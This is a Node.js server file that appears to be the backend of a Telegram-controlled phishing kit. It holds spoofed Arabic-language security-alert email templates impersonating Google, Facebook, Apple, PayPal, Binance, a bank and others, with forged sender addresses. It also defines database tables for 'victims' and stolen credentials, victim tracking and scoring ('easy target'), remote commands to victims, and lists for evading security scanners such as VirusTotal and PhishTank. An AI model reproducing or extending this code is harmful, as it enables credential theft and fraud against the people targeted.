require('dotenv').config();
process.on('unhandledRejection', (err) => console.log('Unhandled:', err.message));
const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const twilio = require('twilio');
const { Pool } = require('pg');
const { Parser } = require('json2csv');
const schedule = require('node-schedule');
const nodemailer = require('nodemailer');
const OpenAI = require('openai');
const openai = new OpenAI({
    apiKey: process.env.AI_INTEGRATIONS_OPENAI_API_KEY,
    baseURL: process.env.AI_INTEGRATIONS_OPENAI_BASE_URL,
});
const botToken = process.env["bot"];
const noopBot = new Proxy({}, { get: () => (...args) => { const cb = args.find(a => typeof a === 'function'); if(cb) return cb; return Promise.resolve(); } });
const bot = botToken ? new TelegramBot(botToken, {polling: true}) : noopBot;
if (!botToken) console.log("Warning: No Telegram bot token found. Bot features disabled.");

// Email templates with CID embedded logos for maximum compatibility
const emailTemplates = {
    google: { 
        name: "Google", 
        from: "no-reply@accounts.google.com", 
        subject: "تنبيه أمان مهم لحسابك في Google",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#ffffff;font-family:Roboto,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;"><tr><td style="padding:20px 0;text-align:center;"><img src="${cid}" alt="Google" style="height:40px;width:auto;"></td></tr><tr><td style="padding:30px 0;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="padding-bottom:30px;"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="width:72px;height:72px;background:#4285f4;border-radius:50%;text-align:center;"><span style="font-size:32px;line-height:72px;color:#fff;">🛡</span></td></tr></table></td></tr><tr><td style="font-size:24px;color:#202124;text-align:center;padding-bottom:24px;">تنبيه أمان مهم</td></tr><tr><td style="font-size:14px;color:#5f6368;line-height:24px;text-align:center;padding-bottom:30px;">${body}</td></tr><tr><td align="center" style="padding-bottom:30px;"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#1a73e8;border-radius:4px;"><a href="${link}" style="display:inline-block;padding:12px 24px;font-size:14px;color:#ffffff;text-decoration:none;font-weight:500;">مراجعة النشاط</a></td></tr></table></td></tr></table></td></tr><tr><td style="border-top:1px solid #e0e0e0;padding:20px 0;font-size:12px;color:#5f6368;text-align:center;">© ${new Date().getFullYear()} Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</td></tr></table></td></tr></table></body></html>`
    },
    facebook: { 
        name: "Facebook", 
        from: "security@facebookmail.com", 
        subject: "تم الكشف عن محاولة تسجيل دخول جديدة",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f0f2f5"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:8px;overflow:hidden;"><tr><td style="background:#1877f2;padding:20px;text-align:center;"><img src="${cid}" alt="Facebook" style="height:40px;width:auto;"></td></tr><tr><td style="padding:30px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:20px;color:#1c1e21;padding-bottom:20px;">مرحباً،</td></tr><tr><td style="font-size:16px;color:#606770;line-height:26px;padding-bottom:30px;">${body}</td></tr><tr><td style="padding-bottom:30px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#1877f2;border-radius:6px;text-align:center;"><a href="${link}" style="display:block;padding:14px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:bold;">تأمين الحساب</a></td></tr></table></td></tr><tr><td style="font-size:13px;color:#90949c;">إذا لم تقم بهذا النشاط، يُرجى تأمين حسابك فوراً.</td></tr></table></td></tr><tr><td style="background:#f5f6f7;padding:20px;text-align:center;font-size:12px;color:#8a8d91;">Meta Platforms, Inc.، 1 Hacker Way، Menlo Park، CA 94025</td></tr></table></td></tr></table></body></html>`
    },
    instagram: { 
        name: "Instagram", 
        from: "security@mail.instagram.com", 
        subject: "لقد لاحظنا محاولة تسجيل دخول غير معتادة",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#fafafa"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border:1px solid #dbdbdb;"><tr><td style="padding:30px;text-align:center;border-bottom:1px solid #dbdbdb;"><img src="${cid}" alt="Instagram" style="height:52px;width:auto;"></td></tr><tr><td style="padding:40px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:16px;color:#262626;line-height:26px;text-align:center;padding-bottom:30px;">${body}</td></tr><tr><td align="center" style="padding-bottom:30px;"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#0095f6;border-radius:8px;"><a href="${link}" style="display:inline-block;padding:14px 48px;font-size:14px;color:#ffffff;text-decoration:none;font-weight:600;">تأكيد هويتك</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:20px;text-align:center;font-size:12px;color:#8e8e8e;">© Instagram من Meta</td></tr></table></td></tr></table></body></html>`
    },
    whatsapp: { 
        name: "WhatsApp", 
        from: "noreply@support.whatsapp.com", 
        subject: "تم طلب رمز التحقق الخاص بك",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f0f0f0;font-family:Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f0f0f0"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:12px;overflow:hidden;"><tr><td style="background:#00a884;padding:24px;text-align:center;"><img src="${cid}" alt="WhatsApp" style="height:48px;width:auto;"></td></tr><tr><td style="padding:40px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="padding-bottom:30px;"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="width:80px;height:80px;background:#25d366;border-radius:50%;text-align:center;"><span style="font-size:40px;line-height:80px;color:#fff;">✓</span></td></tr></table></td></tr><tr><td style="font-size:16px;color:#41525d;line-height:26px;text-align:center;padding-bottom:30px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#00a884;border-radius:24px;"><a href="${link}" style="display:inline-block;padding:14px 56px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:bold;">التحقق الآن</a></td></tr></table></td></tr></table></td></tr><tr><td style="background:#f7f8fa;padding:20px;text-align:center;font-size:12px;color:#8696a0;">© WhatsApp LLC | Meta</td></tr></table></td></tr></table></body></html>`
    },
    apple: { 
        name: "Apple", 
        from: "noreply@email.apple.com", 
        subject: "تم قفل Apple ID الخاص بك",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,SF Pro Display,Segoe UI,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f5f5f7"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;"><tr><td style="padding:40px;text-align:center;border-bottom:1px solid #d2d2d7;"><img src="${cid}" alt="Apple" style="height:52px;width:auto;"></td></tr><tr><td style="padding:40px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:28px;color:#1d1d1f;text-align:center;font-weight:600;padding-bottom:24px;">Apple ID</td></tr><tr><td style="font-size:17px;color:#1d1d1f;line-height:28px;text-align:center;padding-bottom:36px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#0071e3;border-radius:12px;"><a href="${link}" style="display:inline-block;padding:14px 36px;font-size:17px;color:#ffffff;text-decoration:none;font-weight:500;">إلغاء قفل الحساب</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:28px;text-align:center;font-size:12px;color:#86868b;">TM and © ${new Date().getFullYear()} Apple Inc. One Apple Park Way, Cupertino, CA 95014</td></tr></table></td></tr></table></body></html>`
    },
    microsoft: { 
        name: "Microsoft", 
        from: "account-security-noreply@accountprotection.microsoft.com", 
        subject: "تنبيه أمان غير عادي لحساب Microsoft",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f2f2f2;font-family:Segoe UI,Tahoma,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f2f2f2"><tr><td align="center" style="padding:40px 20px;"><table width="550" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;"><tr><td style="padding:24px 40px;border-bottom:1px solid #e5e5e5;"><img src="${cid}" alt="Microsoft" style="height:24px;width:auto;"></td></tr><tr><td style="padding:40px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:24px;color:#1a1a1a;font-weight:600;padding-bottom:20px;">تنبيه أمان حساب Microsoft</td></tr><tr><td style="font-size:15px;color:#505050;line-height:26px;padding-bottom:28px;">${body}</td></tr><tr><td style="padding-bottom:28px;"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#0067b8;"><a href="${link}" style="display:inline-block;padding:12px 28px;font-size:15px;color:#ffffff;text-decoration:none;font-weight:600;">تأمين حسابك</a></td></tr></table></td></tr></table></td></tr><tr><td style="background:#f2f2f2;padding:20px 40px;font-size:11px;color:#666;text-align:center;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</td></tr></table></td></tr></table></body></html>`
    },
    amazon: { 
        name: "Amazon", 
        from: "auto-confirm@amazon.com", 
        subject: "هناك مشكلة في حسابك على Amazon",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#eaeded;font-family:Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#eaeded"><tr><td align="center" style="padding:30px 20px;"><table width="550" cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#232f3e;padding:18px 30px;"><img src="${cid}" alt="Amazon" style="height:32px;width:auto;"></td></tr><tr><td style="background:#ffffff;padding:36px 30px;border:1px solid #ddd;border-top:none;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:16px;color:#111;padding-bottom:16px;font-weight:600;">مرحباً،</td></tr><tr><td style="font-size:14px;color:#333;line-height:24px;padding-bottom:28px;">${body}</td></tr><tr><td><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;"><a href="${link}" style="display:inline-block;padding:10px 28px;font-size:14px;color:#111;text-decoration:none;">تأكيد حسابك</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:20px;text-align:center;font-size:11px;color:#555;">© ${new Date().getFullYear()} Amazon.com, Inc.</td></tr></table></td></tr></table></body></html>`
    },
    paypal: { 
        name: "PayPal", 
        from: "service@paypal.com", 
        subject: "إجراء مطلوب: تم تقييد حسابك مؤقتاً",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f5f7fa;font-family:Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f5f7fa"><tr><td align="center" style="padding:40px 20px;"><table width="550" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:8px;overflow:hidden;"><tr><td style="background:#003087;padding:28px;text-align:center;"><img src="${cid}" alt="PayPal" style="height:32px;width:auto;"></td></tr><tr><td style="padding:44px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:26px;color:#2c2e2f;text-align:center;font-weight:500;padding-bottom:20px;">نحتاج مساعدتك</td></tr><tr><td style="font-size:16px;color:#687173;line-height:28px;text-align:center;padding-bottom:36px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#0070ba;border-radius:24px;"><a href="${link}" style="display:inline-block;padding:16px 52px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:bold;">تأكيد الحساب</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:24px;text-align:center;font-size:12px;color:#687173;">PayPal, Inc. | 2211 North First Street | San Jose, CA 95131</td></tr></table></td></tr></table></body></html>`
    },
    netflix: { 
        name: "Netflix", 
        from: "info@mailer.netflix.com", 
        subject: "مطلوب إجراء: تحديث معلومات الدفع",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#141414;font-family:Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#141414"><tr><td align="center" style="padding:40px 20px;"><table width="550" cellpadding="0" cellspacing="0" border="0" style="background:#000000;"><tr><td style="padding:28px 40px;"><img src="${cid}" alt="Netflix" style="height:36px;width:auto;"></td></tr><tr><td style="padding:0 40px 44px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:32px;color:#ffffff;font-weight:700;padding-bottom:28px;">مرحباً،</td></tr><tr><td style="font-size:16px;color:#b3b3b3;line-height:28px;padding-bottom:36px;">${body}</td></tr><tr><td><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#e50914;border-radius:4px;"><a href="${link}" style="display:inline-block;padding:16px 36px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:bold;">تحديث معلومات الدفع</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:28px 40px;font-size:13px;color:#757575;">Netflix, Inc. | Los Gatos, California, USA</td></tr></table></td></tr></table></body></html>`
    },
    bank: { 
        name: "البنك", 
        from: "alerts@secure-bank.com", 
        subject: "تنبيه أمني: تم رصد معاملة مشبوهة",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f4f4f4;font-family:Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f4"><tr><td align="center" style="padding:40px 20px;"><table width="550" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:12px;overflow:hidden;"><tr><td style="background:linear-gradient(135deg,#1a5336,#2d7a4f);padding:32px;text-align:center;"><span style="font-size:32px;font-weight:bold;color:#fff;">🏦 البنك</span><br><span style="font-size:14px;color:rgba(255,255,255,0.85);">الخدمات المصرفية الآمنة</span></td></tr><tr><td style="padding:36px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:16px;font-size:14px;color:#856404;">⚠️ تنبيه أمني: تم رصد نشاط غير معتاد على حسابك</td></tr><tr><td style="height:24px;"></td></tr><tr><td style="font-size:15px;color:#333;line-height:26px;padding-bottom:32px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#1a5336;border-radius:8px;"><a href="${link}" style="display:inline-block;padding:16px 52px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:bold;">تأكيد المعاملة</a></td></tr></table></td></tr></table></td></tr><tr><td style="background:#f8f9fa;padding:20px;text-align:center;font-size:12px;color:#666;">هذه رسالة آلية من نظام الأمان المصرفي</td></tr></table></td></tr></table></body></html>`
    },
    uber: { 
        name: "Uber", 
        from: "noreply@uber.com", 
        subject: "رحلتك القادمة - تأكيد مطلوب",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f6f6f6;font-family:Uber Move,Helvetica,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f6f6f6"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:8px;overflow:hidden;"><tr><td style="background:#000000;padding:24px;text-align:center;"><span style="font-size:28px;font-weight:bold;color:#fff;">Uber</span></td></tr><tr><td style="padding:36px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:18px;color:#000;font-weight:600;padding-bottom:16px;">مرحباً،</td></tr><tr><td style="font-size:15px;color:#545454;line-height:26px;padding-bottom:28px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#000000;border-radius:8px;"><a href="${link}" style="display:inline-block;padding:14px 48px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:600;">تأكيد الحساب</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:24px;text-align:center;font-size:12px;color:#8b8b8b;">© ${new Date().getFullYear()} Uber Technologies Inc.</td></tr></table></td></tr></table></body></html>`
    },
    spotify: { 
        name: "Spotify", 
        from: "no-reply@spotify.com", 
        subject: "تنبيه أمني: تم تسجيل دخول جديد",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#121212;font-family:Circular,Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#121212"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#181818;border-radius:8px;overflow:hidden;"><tr><td style="padding:32px;text-align:center;"><span style="font-size:32px;font-weight:bold;color:#1DB954;">● Spotify</span></td></tr><tr><td style="padding:0 36px 36px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:24px;color:#ffffff;font-weight:700;padding-bottom:20px;">مرحباً،</td></tr><tr><td style="font-size:15px;color:#b3b3b3;line-height:26px;padding-bottom:28px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#1DB954;border-radius:500px;"><a href="${link}" style="display:inline-block;padding:14px 56px;font-size:16px;color:#000000;text-decoration:none;font-weight:700;">تأمين الحساب</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:24px;text-align:center;font-size:12px;color:#535353;">© ${new Date().getFullYear()} Spotify AB</td></tr></table></td></tr></table></body></html>`
    },
    discord: { 
        name: "Discord", 
        from: "noreply@discord.com", 
        subject: "تسجيل دخول من موقع جديد",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#36393f;font-family:Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#36393f"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#2f3136;border-radius:5px;overflow:hidden;"><tr><td style="padding:32px;text-align:center;"><span style="font-size:28px;font-weight:bold;color:#5865F2;">Discord</span></td></tr><tr><td style="padding:0 32px 32px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:16px;color:#ffffff;line-height:26px;padding-bottom:24px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#5865F2;border-radius:3px;"><a href="${link}" style="display:inline-block;padding:12px 40px;font-size:14px;color:#ffffff;text-decoration:none;font-weight:600;">التحقق من الهوية</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:20px;text-align:center;font-size:11px;color:#72767d;">أرسلت من Discord • San Francisco, CA</td></tr></table></td></tr></table></body></html>`
    },
    binance: { 
        name: "Binance", 
        from: "do-not-reply@binance.com", 
        subject: "تنبيه أمني: نشاط مشبوه على حسابك",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#0b0e11;font-family:IBM Plex Sans,Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0b0e11"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#1e2329;border-radius:8px;overflow:hidden;"><tr><td style="padding:28px;text-align:center;border-bottom:1px solid #2b3139;"><span style="font-size:28px;font-weight:bold;color:#F0B90B;">◆ Binance</span></td></tr><tr><td style="padding:32px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#2b3139;border-radius:8px;padding:16px;margin-bottom:20px;"><span style="font-size:14px;color:#F0B90B;">⚠️ تحذير أمني</span></td></tr><tr><td style="height:20px;"></td></tr><tr><td style="font-size:15px;color:#eaecef;line-height:26px;padding-bottom:28px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#F0B90B;border-radius:4px;"><a href="${link}" style="display:inline-block;padding:14px 48px;font-size:14px;color:#0b0e11;text-decoration:none;font-weight:600;">تأمين الحساب</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:20px;text-align:center;font-size:11px;color:#5e6673;">© ${new Date().getFullYear()} Binance</td></tr></table></td></tr></table></body></html>`
    },
    telegram_app: { 
        name: "Telegram", 
        from: "noreply@telegram.org", 
        subject: "رمز تسجيل الدخول الخاص بك",
        template: (link, body, cid) => `<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head><body style="margin:0;padding:0;background:#f4f4f5;font-family:-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f5"><tr><td align="center" style="padding:40px 20px;"><table width="520" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:12px;overflow:hidden;"><tr><td style="padding:32px;text-align:center;"><span style="font-size:48px;">✈️</span><br><span style="font-size:24px;font-weight:600;color:#0088cc;">Telegram</span></td></tr><tr><td style="padding:0 32px 32px;"><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:16px;color:#222;line-height:28px;text-align:center;padding-bottom:28px;">${body}</td></tr><tr><td align="center"><table cellpadding="0" cellspacing="0" border="0"><tr><td style="background:#0088cc;border-radius:8px;"><a href="${link}" style="display:inline-block;padding:14px 56px;font-size:16px;color:#ffffff;text-decoration:none;font-weight:600;">تأكيد الهوية</a></td></tr></table></td></tr></table></td></tr><tr><td style="padding:20px;text-align:center;font-size:12px;color:#8e8e93;">Telegram Messenger</td></tr></table></td></tr></table></body></html>`
    }
};

// Email sending state
const emailState = new Map();

// PostgreSQL Database
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Blocked IPs storage
const blockedIPs = new Map();
// Click tracking
const linkClicks = new Map();
// Internal URL shortener storage
const shortLinks = new Map();
// Password protected links
const protectedLinks = new Map();
// Link expiry times
const linkExpiry = new Map();
// GeoFencing rules
const geoFences = new Map();
// Anti-bot detection
const botSignatures = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'libwww', 'go-http'];
// Statistics cache
const statsCache = new Map();
// User settings
const userSettings = new Map();
// Last known location per user (for resend)
const lastKnownLocation = new Map();
// Waiting for QR Code input
const waitingQRCode = new Set();
// Bulk email state
const bulkEmailState = new Map();
// Scheduled emails
const scheduledEmails = new Map();
// One-time links (burn after read)
const oneTimeLinks = new Map();
// Smart redirect rules (per user)
const smartRedirects = new Map();
// Victim notes
const victimNotes = new Map();
// Victim categories
const victimCategories = new Map();
// Anti-analysis protection
const analysisBlockers = ['virustotal', 'urlscan', 'hybrid-analysis', 'any.run', 'joe sandbox', 'cuckoo', 'triage', 'browserling', 'urlvoid', 'sucuri', 'phishtank'];

// Victim remote commands (ip -> [{command, data, timestamp}])
const victimCommands = new Map();
// Broadcast messages storage
const broadcastMessages = [];
// Active sessions tracking (ip -> {lastSeen, userAgent, country})
const activeSessions = new Map();
// Whitelisted countries
const whitelistedCountries = new Set();
// Geo-lock per link path
const geoLockedLinks = new Map();
// Device-lock per link path
const deviceLockedLinks = new Map();
// Click limits per link path
const clickLimits = new Map();
// Click counts per link path
const clickCounts = new Map();
// One-time link usage tracking
const usedOneTimeLinks = new Set();
// Chain link progress (sessionId -> currentIndex)
const chainProgress = new Map();
// Per-link statistics
const linkStats = new Map();
// Pixel tracking logs
const pixelLogs = new Map();

let slackWebhook = '';
let teamsWebhook = '';
let pushoverConfig = {};
let iftttKey = '';
let mediaNotifyEnabled = false;
let adminChatIds = new Set();
const highValueCountries = ['US', 'UK', 'UAE', 'SA', 'GB', 'AE', 'QA', 'KW', 'BH', 'OM', 'DE', 'FR', 'CA', 'AU', 'CH', 'NO', 'SE', 'DK', 'NL', 'JP', 'SG'];
const customPages = new Map();
const activityLog = [];
const apiKey = require('crypto').randomBytes(32).toString('hex');
const adminSet = new Set();
const visitorHistory = new Map();

function logActivity(action, details = {}) {
    activityLog.unshift({ action, details, timestamp: new Date().toISOString() });
    if (activityLog.length > 1000) activityLog.pop();
}

function classifyVictim(data) {
    if (data.devtools || data.debugger) return 'technical';
    if (data.cameraBlocked || data.locationBlocked || data.notificationBlocked) return 'cautious';
    let score = 0;
    if (data.ip) score++;
    if (data.location) score++;
    if (data.battery) score++;
    if (data.camera) score++;
    if (data.audio) score++;
    if (data.contacts) score++;
    if (data.clipboard) score++;
    if (score >= 4) return 'easy target';
    if (score >= 2) return 'moderate';
    return 'unknown';
}

function detectBotBehavior(movements) {
    if (!movements || !Array.isArray(movements) || movements.length < 3) return { isBot: false, reason: '' };
    let linearCount = 0;
    let fastCount = 0;
    for (let i = 1; i < movements.length; i++) {
        const dt = movements[i].t - movements[i-1].t;
        if (dt < 5) fastCount++;
        if (i >= 2) {
            const dx1 = movements[i].x - movements[i-1].x;
            const dy1 = movements[i].y - movements[i-1].y;
            const dx2 = movements[i-1].x - movements[i-2].x;
            const dy2 = movements[i-1].y - movements[i-2].y;
            if (Math.abs(dx1 * dy2 - dy1 * dx2) < 1) linearCount++;
        }
    }
    const linearRatio = linearCount / (movements.length - 2);
    const fastRatio = fastCount / (movements.length - 1);
    if (linearRatio > 0.8) return { isBot: true, reason: 'too_linear' };
    if (fastRatio > 0.7) return { isBot: true, reason: 'too_fast' };
    return { isBot: false, reason: '' };
}

// Initialize Database Tables
async function initDB() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS victims (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50),
                ip VARCHAR(50),
                country VARCHAR(100),
                city VARCHAR(100),
                device VARCHAR(200),
                browser VARCHAR(200),
                os VARCHAR(100),
                screen VARCHAR(50),
                template VARCHAR(50),
                is_vpn BOOLEAN DEFAULT false,
                latitude DECIMAL(10, 8),
                longitude DECIMAL(11, 8),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS credentials (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50),
                platform VARCHAR(50),
                email VARCHAR(200),
                password VARCHAR(200),
                phone VARCHAR(50),
                extra_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS bot_users (
                id SERIAL PRIMARY KEY,
                chat_id BIGINT UNIQUE,
                username VARCHAR(100),
                first_name VARCHAR(100),
                discord_webhook TEXT,
                vip_countries TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS link_clicks (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50),
                template VARCHAR(50),
                ip VARCHAR(50),
                user_agent TEXT,
                is_bot BOOLEAN DEFAULT false,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS blocked_ips (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50),
                ip VARCHAR(50),
                reason VARCHAR(200),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS scheduled_sms (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50),
                phone_numbers TEXT,
                message TEXT,
                scheduled_time TIMESTAMP,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);
        console.log("✅ Database initialized!");
    } catch(e) {
        console.log("DB Error:", e.message);
    }
}
initDB();

// Twilio Client
const twilioClient = process.env.TWILIO_SID && process.env.TWILIO_TOKEN ? twilio(process.env.TWILIO_SID, process.env.TWILIO_TOKEN) : null;
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
